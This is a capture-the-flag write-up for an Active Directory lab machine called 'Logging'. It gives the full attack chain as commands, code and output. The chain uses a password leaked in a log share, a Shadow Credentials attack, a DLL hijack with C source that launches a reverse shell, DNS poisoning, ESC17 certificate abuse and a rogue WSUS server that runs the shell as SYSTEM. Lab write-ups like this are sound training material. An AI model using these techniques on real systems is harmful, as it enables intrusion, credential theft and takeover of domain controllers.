# Logging


## Introduction

This is an assumed breach box meant to showcase the importance of carefully looking through the logs to familiarize yourself with the "victim" environment and find holes to poke at. Players will find a share readable by all domain users where some log files are found. One of them leaks a service account old password through a verbose error. The year in the password can be updated to get a valid password. The service account user will have GenericAll on an MSA account which only the service account can see so detailed enumeration with bloodhound or bloodyAD is crucial. ShadowCredentials attack can be deployed to get the NTLM hash of this MSA user which has WinRM permissions and can get a foothold.

The MSA user has a powershell script leading the player to the "UpdateChecker Agent" scheduled task that runs every 3 minutes. Players will need to enumerate and find that it has a log it appends information to in programdata. Via the information in the log, they'll be able to figure out the opportunity for a DLL hijack. This lateral movement will give them access as user jaylee.clifton and allow them to get the user flag. This user is also part of the IT group and has ESC17 permissions over the UpdateSrv Certificate template. Players will need to use a specific Certipy PR to perform the ESC17 attack to get a certificate for WSUS. With that certificate they can use wsusk to standup a rogue WSUS server. After adding a DNS record pointing the wsus domain to themselves, they'll be able to run arbitrary commands.

# Writeup

# Enumeration

As an Assumed Breach scenario, we start enumerating with the wallace user and find a readable share called Logs.

```bash
nxc smb logging.htb -u wallace.everette -p 'Welcome2026@' --shares          
SMB         192.168.150.145 445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:logging.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         192.168.150.145 445    DC01             [+] logging.htb\wallace.everette:Welcome2026@ 
SMB         192.168.150.145 445    DC01             [*] Enumerated shares
SMB         192.168.150.145 445    DC01             Share           Permissions     Remark
SMB         192.168.150.145 445    DC01             -----           -----------     ------
SMB         192.168.150.145 445    DC01             ADMIN$                          Remote Admin
SMB         192.168.150.145 445    DC01             C$                              Default share
SMB         192.168.150.145 445    DC01             IPC$            READ            Remote IPC
SMB         192.168.150.145 445    DC01             Logs            READ            
SMB         192.168.150.145 445    DC01             NETLOGON        READ            Logon server share 
SMB         192.168.150.145 445    DC01             SYSVOL          READ            Logon server share
```

Using smbclientng or other such tools, we can find some log files.

```bash
smbclientng --host logging.htb -u wallace.everette -p 'Welcome2026@'  
               _          _ _            _                    
 ___ _ __ ___ | |__   ___| (_) ___ _ __ | |_      _ __   __ _ 
/ __| '_ ` _ \| '_ \ / __| | |/ _ \ '_ \| __|____| '_ \ / _` |
\__ \ | | | | | |_) | (__| | |  __/ | | | ||_____| | | | (_| |
|___/_| |_| |_|_.__/ \___|_|_|\___|_| |_|\__|    |_| |_|\__, |
    by @podalirius_                             v2.1.7  |___/  
    
[+] Successfully authenticated to 'logging.htb' as '.\wallace.everette'!
■[\\logging.htb\]> use Logs
■[\\logging.htb\Logs\]> ls
d-------     0.00 B  2026-02-21 16:11  .\
d-------     0.00 B  2026-02-21 16:11  ..\
-a------    1.26 kB  2026-02-21 15:49  Audit_Heartbeat.log
-a------    8.32 kB  2026-02-21 15:49  IdentitySync_Trace_20260219.log
-a------   468.00 B  2026-02-21 15:49  Service_State.log
-a------    1.05 kB  2026-02-22 10:21  TaskMonitor.log
```
The only helpful information would be in the `IdentitySync_Trace_20260219.log` log file where we have a Verbose Error leaking a potential password for `svc_recovery` user:

```
[2026-02-09 03:00:03.012] [PID:4102] [Thread:08] INFO  - SQL Session verified. Synchronizing 14 records (BatchID: 88AF-01).
[2026-02-09 03:00:03.055] [PID:4102] [Thread:04] INFO  - Validating AD target health: DC01.logging.htb (Port 389)
[2026-02-09 03:00:03.110] [PID:4102] [Thread:04] TRACE - Initializing LdapConnection object...
[2026-02-09 03:00:03.125] [PID:4102] [Thread:04] VERBOSE - ConnectionContext Dump: { Domain: "logging.htb", Server: "DC01", SSL: "False",
BindUser: "LOGGING\svc_recovery", BindPass: "Em3rg3ncyPa$$2025", Timeout: 30 }
[2026-02-19 03:00:03.488] [PID:4102] [Thread:04] ERROR - System.DirectoryServices.Protocols.LdapException: A local error occurred.
   at System.DirectoryServices.Protocols.LdapConnection.Bind(NetworkCredential credential)
   at logging.IdentitySync.Engine.LdapProvider.Connect()
   --- Server Error Details ---
   Server error: 8009030C: LdapErr: DSID-0C090569, comment: AcceptSecurityContext error, data 52e, v4563
   Hex Error: 0x31 (LDAP_INVALID_CREDENTIALS)
   Win32 Error: 49 (Invalid Credentials)
   ----------------------------
[2026-02-19 03:00:03.510] [PID:4102] [Thread:12] WARN  - Connectivity failed for logging\svc_recovery. Checking alternate Domain Controller...
[2026-02-09 03:00:03.650] [PID:4102] [Thread:12] CRITICAL - Domain-wide LDAP bind failure. Task aborted.
[2026-02-10 03:00:03.702] [PID:4102] [Thread:12] DEBUG - Generating SMTP alert for it-alerts@logging.htb
[2026-02-10 03:00:04.112] [PID:4102] [Thread:12] INFO  - Process exit code: 1. Cleaning up session buffers.
[2026-02-10 03:05:00.005] [PID:4102] [Thread:01] INFO  - Heartbeat: Service [IdentitySync.Engine] is RESPONSIVE.
```
Trying this password, or any password for this user, players will be met with the `STATUS_ACCOUNT_RESTRICTION` in netexec.

```bash
nxc smb logging.htb -u svc_recovery -p 'Em3rg3ncyPa$$2025'        
SMB         192.168.150.145 445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:logging.htb) (signing:True) (SMBv1:None) (Null Auth:True)                                                                                                        
SMB         192.168.150.145 445    DC01             [-] logging.htb\svc_recovery:Em3rg3ncyPa$$2025 STATUS_ACCOUNT_RESTRICTION 
                                                                                                                                           
┌──(kali㉿kali)-[~/LAB/HTB/logging]
└─$ nxc smb logging.htb -u svc_recovery -p 'anything'         
SMB         192.168.150.145 445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:logging.htb) (signing:True) (SMBv1:None) (Null Auth:True)                                                                                                        
SMB         192.168.150.145 445    DC01             [-] logging.htb\svc_recovery:anything STATUS_ACCOUNT_RESTRICTION
```
This should tell them that the user is in the `Protected Users` group so they can't use regular login. If they gathered Bloodhound data with the wallace user, they'll confirm that the user is part of the Protected Users group.

<p align="center">
  <img src="https://i.imgur.com/8E3yLXI.png" alt="img" />
</p>

This can be done with nxc as well:

```bash
nxc ldap logging.htb -u wallace.everette -p 'Welcome2026@' --groups "Protected Users"
LDAP        192.168.150.145 389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:logging.htb) (signing:None) (channel binding:Never)
LDAP        192.168.150.145 389    DC01             [+] logging.htb\wallace.everette:Welcome2026@ 
LDAP        192.168.150.145 389    DC01             administrator
LDAP        192.168.150.145 389    DC01             svc_recovery
```

Since we can't do regular NTLM authentication, a workaround is to do Kerberos Authentication with `getTGT`. Trying the password found in the logs will be invalid.

```bash
getTGT.py logging.htb/svc_recovery:'Em3rg3ncyPa$$2025'
Impacket v0.13.0.dev0+20250626.63631.6b8f6231 - Copyright Fortra, LLC and its affiliated companies 

Kerberos SessionError: KDC_ERR_PREAUTH_FAILED(Pre-authentication information was invalid)
```

Given the format of the password though, we can increase the number of the year to the current one and try again:

```bash
getTGT.py logging.htb/svc_recovery:'Em3rg3ncyPa$$2026'
Impacket v0.13.0.dev0+20250626.63631.6b8f6231 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in svc_recovery.ccache
```
We successfully logged in and got a ticket for the user svc_recovery. Gathering data only with the wallace user won't show any outbound edges for the service user. Players will need to learn that enumerating again with Bloodhound can reveal further permissions and attack paths.

```bash
nxc ldap logging.htb --use-kcache --dns-server 192.168.150.145 --bloodhound -c All
```

Now we can notice an Outbound edge and the svc_recovery user has GenericWrite over an MSA account:

<p align="center">
  <img src="https://i.imgur.com/wrTeX44.png" alt="img" />
</p>

This can also be confirmed with BloodyAD by looking to see what objects the user has write permissions over.

```bash
bloodyAD --host dc01.logging.htb -d logging.htb -u svc_recovery -k get writable

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=logging,DC=htb
permission: WRITE

distinguishedName: CN=svc_recovery,CN=Users,DC=logging,DC=htb
permission: WRITE

distinguishedName: CN=msa_health,CN=Managed Service Accounts,DC=logging,DC=htb
permission: CREATE_CHILD; WRITE

distinguishedName: DC=logging.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=logging,DC=htb
permission: CREATE_CHILD

distinguishedName: DC=_msdcs.logging.htb,CN=MicrosoftDNS,DC=ForestDnsZones,DC=logging,DC=htb
permission: CREATE_CHILD
```

# Foothold

With the GenericWrite permissions, we can perform a ShadowCredentials attack using bloodyAD or any other tools players might prefer, bloodyAD is easiest.

```bash
bloodyAD --host dc01.logging.htb -d logging.htb -u svc_recovery -k add shadowCredentials msa_health$
[+] KeyCredential generated with following sha256 of RSA key: 5758d7f901fd7ee73c836118ba43f6d51188e97b317bf897420a7026de280b73
[+] TGT stored in ccache file msa_health$_a7.ccache

NT: 603fc24ee01a9409f83c9d1d701485c5
```

Bloodhound data or other enumeration will show the MSA user being part of the Remote Management Users group and as such we can WinRM and get a foothold:

```bash
evil-winrm-py -i logging.htb -u msa_health$ -H 603fc24ee01a9409f83c9d1d701485c5
          _ _            _                             
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.5.0

[*] Connecting to 'logging.htb:5985' as 'msa_health$'
evil-winrm-py PS C:\Users\msa_health$\Documents>
```

# Lateral Movement

Within the documents folder for the MSA user, we notice a powershell script:

```bash
evil-winrm-py PS C:\Users\msa_health$\Documents> ls


    Directory: C:\Users\msa_health$\Documents


Mode                LastWriteTime         Length Name                                                                   
----                -------------         ------ ----                                                                   
-a----        2/22/2026   1:50 AM           1060 taskmonitor.ps1                                                        


evil-winrm-py PS C:\Users\msa_health$\Documents> cat taskmonitor.ps1
<#
.SYNOPSIS
    Monitors the status of the "UpdateChecker Agent" scheduled task.
    Uses COM interface to avoid CIM/WMI permission issues.
#>

$TaskName = "UpdateChecker Agent"
$LogPath = "C:\Shares\Logs\TaskMonitor.log"
$Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"

try {
    $service = New-Object -ComObject "Schedule.Service"
    $service.Connect()
    $task = $service.GetFolder("\").GetTask($TaskName)

    $State = switch ($task.State) {
        1 { "Disabled" }
        2 { "Queued" }
        3 { "Ready" }
        4 { "Running" }
        5 { "Disabled" }
        6 { "Unknown" }
        default { "Unknown" }
    }

    if ($State -ne "Ready" -and $State -ne "Running") {
        $Message = "[$Timestamp] WARN  - Task [$TaskName] is in an unexpected state: $State"
    }
    else {
        $Message = "[$Timestamp] INFO  - Task [$TaskName] health check: OK (State: $State)"
    }
}
catch {
    $Message = "[$Timestamp] ERROR - Failed to query task [$TaskName]. Exception: $($_.Exception.Message)"
}

Add-Content -Path $LogPath -Value $Message
```
This seems to be looking at a scheduled task and checking if it's running or not. The log file it creates could also be found in the initial enumeration, in the share. Now with more access though, we can enumerate this task ourselves.

Trying to use schtasks will be met with Access Denied:

```powershell
schtasks /query /fo LIST /v /tn "UpdateChecker Agent"
Program 'schtasks.exe' failed to run: Access is denied
```

Trying to use Get-ScheduledTask will present the same problem:

```powershell
Get-ScheduledTask  -TaskName "UpdateChecker Agent"
Cannot connect to CIM server. Access denied
```

So a workaround is to use the same tactic as the script itself and rely on using the COM Object.

```powershell
$TaskName = "UpdateChecker Agent"
$service = New-Object -ComObject "Schedule.Service"
$service.Connect()
$task = $service.GetFolder("\").GetTask($TaskName)
$task

Name               : UpdateChecker Agent
Path               : \UpdateChecker Agent
State              : 3
Enabled            : True
LastRunTime        : 4/19/2026 6:59:15 AM
LastTaskResult     : 0
NumberOfMissedRuns : 0
NextRunTime        : 4/19/2026 7:02:15 AM
Definition         : System.__ComObject
Xml                : <?xml version="1.0" encoding="UTF-16"?>
                     <Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
                       <RegistrationInfo>
                         <Date>2026-04-16T16:39:34.3280175</Date>
                         <Author>logging\Administrator</Author>
                         <URI>\UpdateChecker Agent</URI>
                       </RegistrationInfo>
                       <Principals>
                         <Principal id="Author">
                           <UserId>S-1-5-21-4020823815-2796529489-1682170552-2105</UserId>
                           <LogonType>Password</LogonType>
                         </Principal>
                       </Principals>
                       <Settings>
                         <DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries>
                         <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
                         <MultipleInstancesPolicy>Parallel</MultipleInstancesPolicy>
                         <IdleSettings>
                           <StopOnIdleEnd>true</StopOnIdleEnd>
                           <RestartOnIdle>false</RestartOnIdle>
                         </IdleSettings>
                       </Settings>
                       <Triggers>
                         <TimeTrigger>
                           <StartBoundary>2026-04-16T16:38:15</StartBoundary>
                           <Repetition>
                             <Interval>PT3M</Interval>
                           </Repetition>
                         </TimeTrigger>
                       </Triggers>
                       <Actions Context="Author">
                         <Exec>
                           <Command>"C:\Program Files\UpdateMonitor\UpdateMonitor.exe"</Command>
                           <Arguments>500 /scan=3 /autofix=true</Arguments>
                         </Exec>
                       </Actions>
                     </Task>
```
Now that we have the XML of the task, we can see it is running every 3 minutes (PT3M). Although the Author is the administrator, we can see that the Principal UserId is the SID of the `jaylee.clifton` user. It is running this binary "C:\Program Files\UpdateMonitor\UpdateMonitor.exe". Looking at the permissions, we notice that the `IT` group has full permissions on it:

```powershell
icacls "C:\Program Files\UpdateMonitor\UpdateMonitor.exe"
C:\Program Files\UpdateMonitor\UpdateMonitor.exe LOGGING\IT:(I)(F)
```
The user `jaylee.clifton` is also part of the IT group. This is something good to remember for later. Further enumeration shows us a folder called `UpdateMonitor` found in the `programdata` folder as well. If we check the permissions, we can see the default permissions for Builtin/Users which allows us to write data. This is standard for Windows.

```
icacls c:\programdata\updatemonitor
BUILTIN\Users:(I)(CI)(WD,AD,WEA,WA)
```

In the UpdateMonitor folder, we can see another folder called Logs in which we find `monitor.log`. This has a repeating pattern in it, every 3 minutes it prints this:

```
[2026-02-22 03:14:09] Starting Sentinel Update Check...
[2026-02-22 03:14:09] Checking for update on core server...
[2026-02-22 03:14:09] Info: Core did not find file Settings_Update.zip
[2026-02-22 03:14:09] Last status: File not found on core
[2026-02-22 03:14:09] Checking for update on local server...
[2026-02-22 03:14:09] No updates found locally: C:\ProgramData\UpdateMonitor\Settings_Update.zip.
[2026-02-22 03:14:09] Loading update applier: C:\Program Files\UpdateMonitor\bin\settings_update.dll
[2026-02-22 03:14:09] Failed to load settings_update.dll. Error code: 126
[2026-02-22 03:14:09] Update check completed.
```
Taking it one line at a time, we can tell what it is doing. It's checking for an update on a "core server", fails to find a file there called `Settings_Update.zip`, then looks on the local server, specifically in the `programdata\updatemonitor` folder, fails to find it there, and then tries to load a DLL from the `program files` folder, that doesn't seem to exist as indicated by error 126 which signifies "Module Not Found," meaning a required Dynamic Link Library (.dll) file is missing.

This is a classic example of DLL search order hijacking. Since we have write permissions in the programdata folder, we can theoretically insert our own `Settings_Update.zip` file containing a `Settings_Update.dll` file and see what happens.

We can create this standard DLL to execute a command:

```c
#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ 
    system("cmd /c whoami > c:\\windows\\tasks\\test.txt");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call){
        case DLL_PROCESS_ATTACH:
            CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}
```

Then compile it for 32bit with: 

```bash
i686-w64-mingw32-gcc -shared -O2 -o settings_update.dll poc.c -Wl,--subsystem,windows
```

Then we zip it up:

```bash
zip Settings_update.zip Settings_update.dll
```

Upload it and give it full permissions to everyone, or just to jaylee, as you prefer:  

```powershell
evil-winrm-py PS C:\programdata\updatemonitor> upload Settings_update.zip .
Uploading /home/kali/LAB/HTB/Logging/Settings_update.zip: 100%|█████████████████████████████████████| 30.1k/30.1k [00:02<00:00, 10.8kB/s]
[+] File uploaded successfully as: C:\programdata\updatemonitor\Settings_update.zip
evil-winrm-py PS C:\programdata\updatemonitor> icacls Settings_update.zip /grant Everyone:F
processed file: Settings_update.zip
Successfully processed 1 files; Failed processing 0 files
```

After 3 minutes, we check the Log file again.

```
[2026-02-22 04:14:29] Checking for update on local server...
[2026-02-22 04:14:29] Update found: C:\ProgramData\UpdateMonitor\Settings_Update.zip. Attempting to apply...
[2026-02-22 04:14:29] Found existing settings_update.dll, removing for update.
[2026-02-22 04:14:29] Successfully unzipped update to C:\Program Files\UpdateMonitor\bin\
[2026-02-22 04:14:29] Loading update applier: C:\Program Files\UpdateMonitor\bin\settings_update.dll
[2026-02-22 04:14:29] 'PreUpdateCheck' not found in settings_update.dll. Continuing...
[2026-02-22 04:14:29] Update check completed.
```

We can see that it detected our malicious file, unzipped it, but when loading the DLL, it failed because it didn't find a specific function called `PreUpdateCheck`. So let's modify our DLL to add that function, keep it simple and try again. This time we also created a reverse shell .exe with msfvenom and uploaded it in the same directory and gave it full permissions. Our DLL code looks like this now:

```C
#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ 
    system("cmd /c c:\\programdata\\updatemonitor\\rev.exe");
}

__declspec(dllexport) void PreUpdateCheck() { 
    Entry(); 
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    return TRUE;
}
```

Repeat the steps to compile it, upload it and give it full permissions. After 3 minutes we see this in the log:

```
[2026-02-22 04:32:29] Checking for update on local server...
[2026-02-22 04:32:29] Update found: C:\ProgramData\UpdateMonitor\Settings_Update.zip. Attempting to apply...
[2026-02-22 04:32:29] Found existing settings_update.dll, removing for update.
[2026-02-22 04:32:29] Successfully unzipped update to C:\Program Files\UpdateMonitor\bin\
[2026-02-22 04:32:29] Loading update applier: C:\Program Files\UpdateMonitor\bin\settings_update.dll
[2026-02-22 04:32:29] Calling 'PreUpdateCheck' in settings_update.dll
```

And we've successfully pivoted to this user that is in the IT group. And can get the user.txt flag:

```
meterpreter > getuid
Server username: LOGGING\jaylee.clifton
```

# Privilege Escalation

While enumering this user's folders, we can find a Tickets folder containing a file about an incident and mentioning WSUS remediation:  

```
 Directory of c:\Users\jaylee.clifton\Documents\Tickets

04/07/2026  03:13 AM    <DIR>          .
04/07/2026  03:13 AM    <DIR>          ..
04/07/2026  03:13 AM             2,453 Incident_4922_WSUS_Remediation_ViewExport.html
               1 File(s)          2,453 bytes
               2 Dir(s)  60,268,584,960 bytes free
```

Opening this file, we can see some details about a ForceSync task running every 2 minutes. It also mentions `wsus.logging.htb` and that DNS isn't updated yet.


<p align="center">
  <img src="https://i.imgur.com/bjZsvHa.png" alt="img" />
</p>

If we try an nslookup or ping, we can confirm that this isn't something currently reachable by the Domain Controller:  

```
c:\users\jaylee.clifton\documents\tickets>nslookup wsus.logging.htb
nslookup wsus.logging.htb
*** UnKnown can't find wsus.logging.htb: Non-existent domain
1.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.ip6.arpa
        primary name server = 1.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.ip6.arpa
        responsible mail addr = (root)
        serial  = 0
        refresh = 28800 (8 hours)
        retry   = 7200 (2 hours)
        expire  = 604800 (7 days)
        default TTL = 86400 (1 day)
Server:  UnKnown
Address:  ::1


c:\users\jaylee.clifton\documents\tickets>ping wsus.logging.htb
ping wsus.logging.htb
Ping request could not find host wsus.logging.htb. Please check the name and try again.
```

The ticket mentions an internal test subnet but we can't see it here:  

```
c:\users\jaylee.clifton\documents\tickets>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : localdomain
   Link-local IPv6 Address . . . . . : fe80::d5db:2952:c74e:defe%4
   IPv4 Address. . . . . . . . . . . : 192.168.150.145
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.150.2
```

Further enumeration with SharpHound shows us that this user is part of the IT group which has enroll permission on the `UpdateSrv` certificate template.

<p align="center">
  <img src="https://i.imgur.com/P6Itps4.png" alt="img" />
</p>

Since the ticket and the certificate points us to Windows Update, we can query the registry key for more details:  


```
meterpreter > reg enumkey -k HKLM\\Software\\Policies\\Microsoft\\Windows\\WindowsUpdate
Enumerating: HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate

  Keys (1):

        AU

  Values (5):

        AcceptTrustedPublisherCerts
        WUServer
        WUStatusServer
        UpdateServiceUrlAlternate
        SetProxyBehaviorForUpdateDetection
```

Let's check the value of the `WUServer` key and see what it is set to:  

```
meterpreter > reg queryval -k HKLM\\Software\\Policies\\Microsoft\\Windows\\WindowsUpdate -v WUServer
Key: HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate
Name: WUServer
Type: REG_SZ
Data: https://wsus.logging.htb:8531
```

We see it is pointing to this wsus domain which doesn't seem to have a DNS record. Let's add our own and point it to our machine. 


```bash
dnstool.py  -u 'logging.htb\wallace.everette' -p 'Welcome2026@' 192.168.150.145 -a add -r wsus.logging.htb -d 192.168.150.146
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully
```

After a short bit while the DNS record propagates, we can see that nslookup now resolves wsus.logging.htb to our attacker IP:

```
c:\Users\jaylee.clifton>nslookup wsus.logging.htb
nslookup wsus.logging.htb
1.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.ip6.arpa
        primary name server = 1.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.ip6.arpa
        responsible mail addr = (root)
        serial  = 0
        refresh = 28800 (8 hours)
        retry   = 7200 (2 hours)
        expire  = 604800 (7 days)
        default TTL = 86400 (1 day)
Server:  UnKnown
Address:  ::1

Name:    wsus.logging.htb
Address:  192.168.150.146
```

Now let's listen on the port mentioned in the registry key which is the default HTTPS port for WSUS:  

<p align="center">
  <img src="https://i.imgur.com/ttRjEK5.png" alt="img" />
</p>

# ADCS to WSUS = ESC17

We can see that a successfull callback was made, but it's all encrypted due to HTTPS. We need to do some research and see how we can abuse WSUS when it runs on HTTPS. Some enumeration later, we can find this blogpost by [Alexander Neff](https://blog.digitrace.de/2026/01/using-adcs-to-attack-https-enabled-wsus-clients/) which points us to  [ESC17](https://github.com/NeffIsBack/esc17-wiki/blob/master/06-%E2%80%90-Privilege-Escalation.md#esc17-enrollee-supplied-subject-for-server-authentication) and this [PR](https://github.com/ly4k/Certipy/pull/344) for Certipy.

We can install [wsusk](https://github.com/NeffIsBack/wsuks) with the commands below:

```bash
sudo apt install pipx python3-nftables
pipx ensurepath
pipx install wsuks --system-site-packages
sudo ln -s ~/.local/bin/wsuks /usr/local/sbin/wsuks
```

We can also install the specific ESC17 PR:  

```bash
pipx install git+https://github.com/NeffIsBack/Certipy.git@ESC17 --suffix=-esc17
```

We need to run a certipy find command with Jaylee as this user is part of the IT group. We can use Rubeus to get a ticket and work with it in Kali.

```
.\rubeus.exe tgtdeleg /nowrap
```

Copy the Base64 blob and paste it in Kali and convert it to a ccache:

```
echo [base64blob] |base64 -d > jaylee.ticket
ticketConverter.py jaylee.kirbi jaylee.ccache 
Impacket v0.14.0.dev0+20260226.31512.9d3d86ea - Copyright Fortra, LLC and its affiliated companies 

[*] converting kirbi to ccache...
[+] done
```

Now let's look and confirm the ESC17 vulnerable certificate:  

```bash
export KRB5CCNAME=jaylee.ccache
certipy-esc17 find -vulnerable -stdout -u 'jaylee.clifton@logging.htb' -k -dc-host DC01.logging.htb

Certificate Templates
  0
    Template Name                       : UpdateSrv
    Display Name                        : UpdateSrv
    Certificate Authorities             : logging-DC01-CA
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2026-04-07T09:18:27+00:00
    Template Last Modified              : 2026-04-07T09:18:27+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : LOGGING.HTB\IT
                                          LOGGING.HTB\Domain Admins
                                          LOGGING.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : LOGGING.HTB\Administrator
        Full Control Principals         : LOGGING.HTB\Domain Admins
                                          LOGGING.HTB\Enterprise Admins
        Write Owner Principals          : LOGGING.HTB\Domain Admins
                                          LOGGING.HTB\Enterprise Admins
        Write Dacl Principals           : LOGGING.HTB\Domain Admins
                                          LOGGING.HTB\Enterprise Admins
        Write Property Enroll           : LOGGING.HTB\Domain Admins
                                          LOGGING.HTB\Enterprise Admins
    [+] User Enrollable Principals      : LOGGING.HTB\IT
    [!] Vulnerabilities
      ESC17                             : Enrollee supplies subject and template allows server authentication.
    [*] Remarks
      ESC17                             : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
```

Let's request a certificate that we'll use for the wsusk tool:  

```
certipy-esc17 req -u 'jaylee.clifton@logging.htb' -k -target DC01.logging.htb -template UpdateSrv -ca logging-DC01-CA -dns wsus.logging.htb

Certipy v5.0.4 - by Oliver Lyak (ly4k)

[!] DC host (-dc-host) not specified and Kerberos authentication is used. This might fail
[!] DNS resolution failed: The DNS query name does not exist: DC01.logging.htb.
[!] Use -debug to print a stacktrace
[!] DNS resolution failed: The DNS query name does not exist: LOGGING.HTB.
[!] Use -debug to print a stacktrace
[*] Requesting certificate via RPC
[*] Request ID is 9
[*] Successfully requested certificate
[*] Got certificate with DNS Host Name 'wsus.logging.htb'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'wsus.pfx'
[*] Wrote certificate and private key to 'wsus.pfx'
```

Convert the pfx to a pem:  

```bash
openssl pkcs12 -in wsus.pfx -out wsus.pem -nodes --passin pass:
```

Now we stand up the wsusk tool with sudo and run a specific command while serving only. Since we poisoned the DNS record, we don't need any ARP spoofing:  

```
sudo wsuks -t 192.168.150.145 -I tun0 --serve-only --WSUS-Server dc01.logging.htb --tls-cert wsus.pem -c '/accepteula /s cmd.exe "/c c:\\programdata\\updatemonitor\\rev.exe"'
```

After a while, we can see callbacks being made on our rogue WSUS server:  

```
[*] ===== Starting Web Server =====
[*] Using TLS certificate 'wsus.pem' for HTTPS WSUS Server
[*] Starting WSUS Server on 192.168.150.146:8531...
[*] Serving executable as KB: 9214294
[+] Received POST request: /ClientWebService/client.asmx, SOAP Action: "http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/GetConfig"
[+] Received POST request: /ClientWebService/client.asmx, SOAP Action: "http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/GetCookie"
[+] Received POST request: /ClientWebService/client.asmx, SOAP Action: "http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/SyncUpdates"
[+] Received POST request: /ClientWebService/client.asmx, SOAP Action: "http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/GetCookie"
[+] Received POST request: /ClientWebService/client.asmx, SOAP Action: "http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/GetExtendedUpdateInfo"
[+] Received GET request: /d5c65d2d-3e9b-4b21-9d35-8ed5a9691604/PsExec64.exe
[+] GET request for exe: /d5c65d2d-3e9b-4b21-9d35-8ed5a9691604/PsExec64.exe
[+] Received GET request: /d5c65d2d-3e9b-4b21-9d35-8ed5a9691604/PsExec64.exe
[+] GET request for exe: /d5c65d2d-3e9b-4b21-9d35-8ed5a9691604/PsExec64.exe
```

And we have a reverse shell foothold as SYSTEM and can get the root flag:  

```
[*] Sending stage (244806 bytes) to 192.168.150.145
[*] Meterpreter session 3 opened (192.168.150.146:1336 -> 192.168.150.145:51122) at 2026-04-07 08:05:13 -0400

msf exploit(multi/handler) > sessions

Active sessions
===============

  Id  Name  Type                     Information                    Connection
  --  ----  ----                     -----------                    ----------
  1         meterpreter x64/windows  LOGGING\jaylee.clifton @ DC01  192.168.150.146:1336 -> 192.168.150.145:64903 (192.168.150.145)
  2         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ DC01     192.168.150.146:1336 -> 192.168.150.145:51122 (192.168.150.145)

msf exploit(multi/handler) > sessions 2
[*] Starting interaction with 2...

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```


